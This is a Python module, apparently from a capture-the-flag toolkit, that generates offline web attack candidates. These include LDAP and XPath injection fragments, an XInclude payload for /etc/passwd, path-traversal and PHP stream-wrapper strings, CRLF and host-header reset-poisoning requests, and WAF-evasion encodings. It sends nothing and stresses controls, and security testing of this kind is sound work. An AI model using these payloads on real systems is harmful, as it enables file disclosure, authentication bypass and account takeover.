#!/usr/bin/env python3
"""Offline web attack-depth planners for gaps not covered by the focused helpers.

The repository already has byte-exact HTTP desync/cache candidates, XXE/NoSQL/SSRF
helpers, upload polyglots, CORS/CSWSH pages, and CSP/prototype-pollution analysis.
This module supplies the remaining static seams: LDAP/XPath fragments, XInclude,
traversal/LFI wrapper candidates, CRLF/host-header chains, race/business-logic
review plans, and a labelled WAF-normalisation catalogue.

Every API returns inert strings or plans.  Nothing resolves a name, opens a socket,
runs a race, or claims that a candidate worked.  ``verified_syntax`` means only
that a locally parseable container (for example XML) was checked; it never means
that a target is vulnerable.
"""
from __future__ import annotations

import argparse
import dataclasses
import html
import json
import re
import sys
import urllib.parse
import xml.etree.ElementTree as ET
from typing import Any, Sequence


MAX_TEXT = 4096
MAX_ROWS = 64
XI_NS = "http://www.w3.org/2001/XInclude"


class WebDepthInputError(ValueError):
    """Malformed or over-limit offline planner input."""


@dataclasses.dataclass(frozen=True)
class Candidate:
    rank: int
    family: str
    name: str
    value: Any
    requirement: str
    verified_syntax: bool = False
    candidate_only: bool = True
    sent: bool = False
    network_requests: int = 0
    note: str = "review one candidate and confirm it against a benign control; never infer success"


def _row(rank: int, family: str, name: str, value: Any, requirement: str,
         *, verified: bool = False, note: str = "") -> dict[str, Any]:
    row = Candidate(rank, family, name, value, requirement, verified_syntax=verified,
                    note=note or Candidate.__dataclass_fields__["note"].default)
    return dataclasses.asdict(row)


def _text(value: Any, label: str, *, maximum: int = MAX_TEXT,
          allow_empty: bool = False) -> str:
    if not isinstance(value, str):
        raise WebDepthInputError(f"{label} must be text")
    try:
        raw = value.encode("utf-8")
    except UnicodeEncodeError as exc:
        raise WebDepthInputError(f"{label} is not valid Unicode text") from exc
    if len(raw) > maximum:
        raise WebDepthInputError(f"{label} exceeds {maximum} UTF-8 bytes")
    if not allow_empty and not value:
        raise WebDepthInputError(f"{label} must not be empty")
    if "\x00" in value or "\r" in value or "\n" in value:
        raise WebDepthInputError(f"{label} contains a forbidden control character")
    return value


def _name(value: str, label: str) -> str:
    value = _text(value, label, maximum=128)
    if not re.fullmatch(r"[A-Za-z][A-Za-z0-9_.;:-]{0,127}", value):
        raise WebDepthInputError(f"invalid {label}")
    return value


def _xml_name(value: str, label: str) -> str:
    value = _text(value, label, maximum=128)
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]{0,127}", value):
        raise WebDepthInputError(f"invalid {label}")
    return value


def ldap_injection_candidates(attribute: str = "uid") -> list[dict[str, Any]]:
    """Return LDAP-filter *value fragments* with exact parser requirements.

    These are not complete filters because exploitability depends on where the
    application concatenates a value.  Consequently no row is marked verified.
    """
    attribute = _name(attribute, "LDAP attribute")
    variants = (
        ("wildcard", "*", "the application must concatenate an unescaped value into an equality filter"),
        ("close_or_true", f"*)(|({attribute}=*))", "the value must be followed by a closing parenthesis and the server must accept the injected OR"),
        ("close_and_true", f"*)({attribute}=*", "the surrounding filter must supply the final parenthesis and accept an injected AND term"),
        ("not_impossible", f"*)(!({attribute}=__csctf_absent__))", "the injected NOT term must remain inside a syntactically valid surrounding filter"),
        ("nul_suffix", f"*)(|({attribute}=*))%00", "an upstream URL decoder and downstream C-string parser must disagree about the NUL suffix"),
    )
    return [_row(i, "ldap_injection", name, value, requirement,
                 note="value fragment only; inspect the real filter construction before replay")
            for i, (name, value, requirement) in enumerate(variants, 1)]


def xpath_injection_candidates(field: str = "username") -> list[dict[str, Any]]:
    """Return XPath 1.0 string-context fragments, never an authentication verdict."""
    field = _xml_name(field, "XPath field")
    variants = (
        ("or_true_single", "' or '1'='1", "input is interpolated inside a single-quoted XPath string"),
        ("or_true_double", '" or "1"="1', "input is interpolated inside a double-quoted XPath string"),
        ("select_first", f"' or string-length(//{field}[1])>=0 or 'x'='y", "XPath 1.0 functions and the named element are accepted"),
        ("comment_tail", "' or true() or 'x'='", "the application appends a quote but not an independently restrictive predicate"),
        ("boolean_false_control", "' and '1'='2", "paired negative control for a boolean differential; never use the true response alone"),
    )
    return [_row(i, "xpath_injection", name, value, requirement,
                 note="fragment is context-dependent; require a paired false control and structural response difference")
            for i, (name, value, requirement) in enumerate(variants, 1)]


def xinclude_payload(path: str = "/etc/passwd", *, root: str = "root",
                     parse: str = "text") -> dict[str, Any]:
    """Build and locally parse-check one XInclude document."""
    path = _text(path, "path", maximum=1024)
    root = _xml_name(root, "root element")
    if parse not in {"text", "xml"}:
        raise WebDepthInputError("XInclude parse must be text or xml")
    if "://" in path:
        parsed = urllib.parse.urlsplit(path)
        if parsed.scheme != "file" or parsed.netloc not in {"", "localhost"}:
            raise WebDepthInputError("XInclude href must be a local file path/URI")
        href = path
    else:
        if not path.startswith("/"):
            raise WebDepthInputError("XInclude file path must be absolute")
        href = "file://" + urllib.parse.quote(path, safe="/")
    ET.register_namespace("xi", XI_NS)
    element = ET.Element(root)
    ET.SubElement(element, f"{{{XI_NS}}}include", {"href": href, "parse": parse})
    value = ET.tostring(element, encoding="unicode", short_empty_elements=True)
    ET.fromstring(value)  # syntax check only; ElementTree does not resolve XInclude here
    return _row(1, "xinclude", "local_file_include", value,
                "the target parser must process XInclude after parsing and permit local file URIs",
                verified=True,
                note="XML syntax verified locally; file inclusion remains unverified target behavior")


def _target_path(path: str) -> str:
    value = _text(path, "target path", maximum=1024)
    if "://" in value:
        raise WebDepthInputError("target path must not be a URI")
    normalized = value.replace("\\", "/")
    parts = [part for part in normalized.split("/") if part not in {"", "."}]
    if not parts or any(part == ".." for part in parts):
        raise WebDepthInputError("target path must name a concrete file without traversal components")
    return "/".join(parts)


def lfi_traversal_candidates(path: str = "/etc/passwd", *, depth: int = 6,
                             windows: bool = False) -> list[dict[str, Any]]:
    """Return bounded traversal/wrapper strings for one concrete target path."""
    target = _target_path(path)
    if not 1 <= int(depth) <= 16:
        raise WebDepthInputError("depth must be 1..16")
    depth = int(depth)
    slash = "\\" if windows else "/"
    prefix = (".." + slash) * depth
    plain = prefix + target.replace("/", slash)
    encoded = ("..%2f" if not windows else "..%5c") * depth + urllib.parse.quote(target, safe="")
    double = ("..%252f" if not windows else "..%255c") * depth + urllib.parse.quote(urllib.parse.quote(target, safe=""), safe="")
    rows = [
        _row(1, "path_traversal", "plain", plain, "the path join/normalizer must preserve parent traversal"),
        _row(2, "path_traversal", "url_encoded_separator", encoded, "a component must URL-decode after an earlier traversal check"),
        _row(3, "path_traversal", "double_encoded_separator", double, "two components must decode at different normalization stages"),
        _row(4, "path_traversal", "mixed_dot_encoding", (".%2e/" * depth) + target,
             "the filter must inspect raw dots while the filesystem path is decoded later"),
    ]
    if not windows:
        quoted = urllib.parse.quote("/" + target, safe="/")
        rows.extend([
            _row(10, "lfi_wrapper", "php_filter_base64",
                 "php://filter/convert.base64-encode/resource=" + "/" + target,
                 "PHP stream wrappers are accepted and the included resource is returned"),
            _row(11, "lfi_wrapper", "php_filter_iconv",
                 "php://filter/read=convert.iconv.UTF-8.UTF-16LE/resource=" + "/" + target,
                 "PHP iconv stream filter is available; output needs UTF-16LE decoding"),
            _row(12, "lfi_wrapper", "file_uri", "file://" + quoted,
                 "the sink accepts file URIs rather than only filesystem paths"),
            _row(13, "lfi_wrapper", "zip_member", "zip:///tmp/archive.zip%23member.txt",
                 "a target-controlled local ZIP exists at the exact path and PHP zip wrapper is enabled"),
            _row(14, "lfi_wrapper", "phar_member", "phar:///tmp/archive.phar/member.txt",
                 "a target-controlled PHAR exists and the sink invokes the phar wrapper"),
        ])
    return rows[:MAX_ROWS]


def _host(value: str, label: str) -> str:
    value = _text(value, label, maximum=253).rstrip(".").lower()
    if not re.fullmatch(r"(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)*[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?", value):
        raise WebDepthInputError(f"invalid {label}")
    return value


def header_chain_candidates(public_host: str, marker_host: str = "marker.invalid",
                            *, path: str = "/reset") -> list[dict[str, Any]]:
    """Build CRLF and host-header/reset-poisoning candidates as inert request metadata."""
    public_host = _host(public_host, "public host")
    marker_host = _host(marker_host, "marker host")
    path = _text(path, "path", maximum=1024)
    if not path.startswith("/") or path.startswith("//"):
        raise WebDepthInputError("path must be origin-relative")
    if re.search(r"%(?:25)*(?:0d|0a)", path, re.I):
        raise WebDepthInputError("path already contains an encoded newline")
    marker = "CSCTF-Header-Marker"
    crlf = [
        ("percent_crlf", path + "%0d%0aX-CSCTF-Marker:%20" + marker,
         "one URL decode must occur before a response/request header is constructed"),
        ("lowercase_percent_crlf", path + "%0D%0AX-CSCTF-Marker%3A%20" + marker,
         "mixed-case percent decoding must reach a header construction sink"),
        ("double_encoded_crlf", path + "%250d%250aX-CSCTF-Marker%253a%2520" + marker,
         "two decoding layers must occur before header construction"),
    ]
    rows = [_row(i, "crlf", name, value, requirement)
            for i, (name, value, requirement) in enumerate(crlf, 1)]
    headers = (
        ("host", {"Host": marker_host}),
        ("x_forwarded_host", {"Host": public_host, "X-Forwarded-Host": marker_host}),
        ("forwarded", {"Host": public_host, "Forwarded": f"host={marker_host};proto=https"}),
        ("x_original_host", {"Host": public_host, "X-Original-Host": marker_host}),
        ("x_forwarded_proto", {"Host": public_host, "X-Forwarded-Host": marker_host,
                                "X-Forwarded-Proto": "https"}),
    )
    for index, (name, header_map) in enumerate(headers, 10):
        rows.append(_row(index, "host_header", name,
                         {"method": "GET", "path": path, "headers": header_map},
                         "the application/proxy must trust this header when building an absolute reset/cache link",
                         note="marker host only; inspect a saved response/mail preview and never deliver to a real victim"))
    return rows


RACE_SCENARIOS = {
    "coupon": ("apply the same single-use coupon", "read order total", "duplicate discount/credit appears"),
    "transfer": ("submit two transfers against one balance", "read ledger and balance", "both debit decisions used the same pre-state"),
    "redeem": ("redeem one token twice", "read redemption ledger", "two durable redemption records exist"),
    "limit": ("create two objects at a one-object limit", "list objects", "both creations committed past the limit"),
    "upload": ("swap/replace a staged file between validation and consumption", "read final object metadata", "consumer used bytes different from validated bytes"),
}


def race_condition_plan(scenario: str = "coupon", *, marker: str = "CSCTF_RACE_MARKER") -> dict[str, Any]:
    """Return a two-request review plan; it never starts threads or sends requests."""
    scenario = _text(scenario, "scenario", maximum=32).lower()
    marker = _text(marker, "marker", maximum=128)
    if scenario not in RACE_SCENARIOS:
        raise WebDepthInputError("unknown race scenario: " + scenario)
    action, verify, proof = RACE_SCENARIOS[scenario]
    value = {
        "parallelism": 2,
        "requests": [
            {"label": "A", "action": action, "marker": marker + "_A", "send": False},
            {"label": "B", "action": action, "marker": marker + "_B", "send": False},
        ],
        "synchronization": "prepare both requests; player chooses whether/how to release together on the assigned target",
        "verification": verify,
        "positive_proof": proof,
        "negative_control": "repeat sequentially and require the second operation to be rejected",
    }
    return _row(1, "race_toctou", scenario, value,
                "the player has confirmed a reversible challenge-local operation and request budget",
                note="plan only; no concurrency or HTTP occurs in this engine")


BUSINESS_SCENARIOS: dict[str, tuple[tuple[str, str], ...]] = {
    "2fa": (
        ("direct_post_auth_route", "a pre-2FA session can reach the post-auth route without a completed challenge"),
        ("reuse_or_cross_account_code", "a supplied known code is not bound to session, account, purpose, or attempt"),
        ("response_state_trust", "the client alone interprets a mutable success/role field"),
    ),
    "password_reset": (
        ("host_header_poison", "the reset link origin is derived from an untrusted proxy/Host header"),
        ("token_not_bound", "a supplied token is not bound to account, purpose, expiry, and single use"),
        ("email_change_then_reset", "an unverified pending address is accepted as the reset destination"),
    ),
    "checkout": (
        ("negative_quantity", "the server accepts a caller-supplied negative quantity or price delta"),
        ("coupon_reuse", "redemption is not atomically bound to account/order and single use"),
        ("client_price", "the server trusts a caller-supplied price, discount, currency, or total"),
    ),
    "workflow": (
        ("step_skip", "the final endpoint does not enforce prerequisite state server-side"),
        ("stale_object", "an operation uses stale authorization/state after a role or ownership change"),
        ("parameter_binding", "a hidden object/account identifier is trusted instead of session ownership"),
    ),
}


def business_logic_plans(scenario: str) -> list[dict[str, Any]]:
    scenario = _text(scenario, "scenario", maximum=32).lower()
    if scenario not in BUSINESS_SCENARIOS:
        raise WebDepthInputError("unknown business-logic scenario: " + scenario)
    rows = []
    for rank, (name, requirement) in enumerate(BUSINESS_SCENARIOS[scenario], 1):
        rows.append(_row(rank, "business_logic", name,
                         {"baseline": "one normal challenge-local transaction", "candidate": name,
                          "control": "fresh session/account state where applicable", "send": False},
                         requirement,
                         note="review plan only; use supplied accounts/values and one reasoned test, never enumerate codes"))
    return rows


def _percent_all(value: str) -> str:
    return "".join(f"%{byte:02X}" for byte in value.encode("utf-8"))


def _json_escape(value: str) -> str:
    return json.dumps(value, ensure_ascii=True)[1:-1]


def _fullwidth(value: str) -> str:
    out = []
    for char in value:
        code = ord(char)
        if char == " ":
            out.append("\u3000")
        elif 0x21 <= code <= 0x7E:
            out.append(chr(code + 0xFEE0))
        else:
            out.append(char)
    return "".join(out)


def waf_encoding_candidates(payload: str) -> list[dict[str, Any]]:
    """Return labelled encoding/normalisation candidates for one reviewed payload."""
    payload = _text(payload, "payload", maximum=1024)
    once = urllib.parse.quote(payload, safe="")
    variants = (
        ("url_percent", once, "the application URL-decodes once after the filter", True),
        ("url_percent_all", _percent_all(payload), "the application URL-decodes once after the filter", True),
        ("double_url_percent", urllib.parse.quote(once, safe=""), "two components decode in different stages", True),
        ("json_unicode", _json_escape(payload), "the value is parsed as a JSON string after raw-text filtering", True),
        ("html_hex_entities", "".join(f"&#x{ord(ch):x};" for ch in payload),
         "an HTML parser decodes entities before a downstream sink", True),
        ("fullwidth_nfkc", _fullwidth(payload), "a downstream component applies Unicode NFKC normalization", False),
        ("alternating_case", "".join(ch.swapcase() if i % 2 else ch for i, ch in enumerate(payload)),
         "the sink is case-insensitive while the filter is case-sensitive", False),
    )
    # Enforce the claims attached to the locally reversible transforms.  If a
    # future stdlib behavior change breaks one, decline rather than mislabel it.
    reversible_checks = {
        "url_percent": urllib.parse.unquote(once),
        "url_percent_all": urllib.parse.unquote(_percent_all(payload)),
        "double_url_percent": urllib.parse.unquote(urllib.parse.unquote(urllib.parse.quote(once, safe=""))),
        "json_unicode": json.loads(json.dumps(payload, ensure_ascii=True)),
        "html_hex_entities": html.unescape("".join(f"&#x{ord(ch):x};" for ch in payload)),
    }
    if any(decoded != payload for decoded in reversible_checks.values()):
        raise WebDepthInputError("local encoding round-trip failed")
    rows = []
    for rank, (name, value, requirement, reversible) in enumerate(variants, 1):
        rows.append(_row(rank, "waf_encoding", name, value, requirement,
                         verified=reversible,
                         note=("local encoding round-trip checked" if reversible else
                               "semantic equivalence is context-dependent and deliberately unverified")))
    return rows


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:
        raise WebDepthInputError(message)


def build_parser() -> argparse.ArgumentParser:
    parser = _Parser(description="offline web attack-depth candidate planner; sends nothing")
    sub = parser.add_subparsers(dest="mode", required=True)
    ldap = sub.add_parser("ldap"); ldap.add_argument("--attribute", default="uid")
    xpath = sub.add_parser("xpath"); xpath.add_argument("--field", default="username")
    xi = sub.add_parser("xinclude"); xi.add_argument("path"); xi.add_argument("--root", default="root"); xi.add_argument("--parse", choices=("text", "xml"), default="text")
    lfi = sub.add_parser("lfi"); lfi.add_argument("path"); lfi.add_argument("--depth", type=int, default=6); lfi.add_argument("--windows", action="store_true")
    headers = sub.add_parser("headers"); headers.add_argument("public_host"); headers.add_argument("--marker-host", default="marker.invalid"); headers.add_argument("--path", default="/reset")
    race = sub.add_parser("race"); race.add_argument("scenario", choices=tuple(RACE_SCENARIOS)); race.add_argument("--marker", default="CSCTF_RACE_MARKER")
    business = sub.add_parser("business"); business.add_argument("scenario", choices=tuple(BUSINESS_SCENARIOS))
    waf = sub.add_parser("waf"); waf.add_argument("payload")
    for command in (ldap, xpath, xi, lfi, headers, race, business, waf):
        command.add_argument("--json", action="store_true")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    try:
        args = build_parser().parse_args(argv)
        if args.mode == "ldap": result: Any = ldap_injection_candidates(args.attribute)
        elif args.mode == "xpath": result = xpath_injection_candidates(args.field)
        elif args.mode == "xinclude": result = xinclude_payload(args.path, root=args.root, parse=args.parse)
        elif args.mode == "lfi": result = lfi_traversal_candidates(args.path, depth=args.depth, windows=args.windows)
        elif args.mode == "headers": result = header_chain_candidates(args.public_host, args.marker_host, path=args.path)
        elif args.mode == "race": result = race_condition_plan(args.scenario, marker=args.marker)
        elif args.mode == "business": result = business_logic_plans(args.scenario)
        else: result = waf_encoding_candidates(args.payload)
        if args.json:
            print(json.dumps(result, indent=2, sort_keys=True, ensure_ascii=False))
        else:
            rows = result if isinstance(result, list) else [result]
            for row in rows:
                print(f'{row["rank"]}. [{row["family"]}] {row["name"]}: {row["value"]}')
                print(f'   requires: {row["requirement"]}')
        return 0
    except (WebDepthInputError, ValueError, TypeError, UnicodeError, OverflowError,
            RecursionError, MemoryError, OSError) as exc:
        print(f"web_attack_depth: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
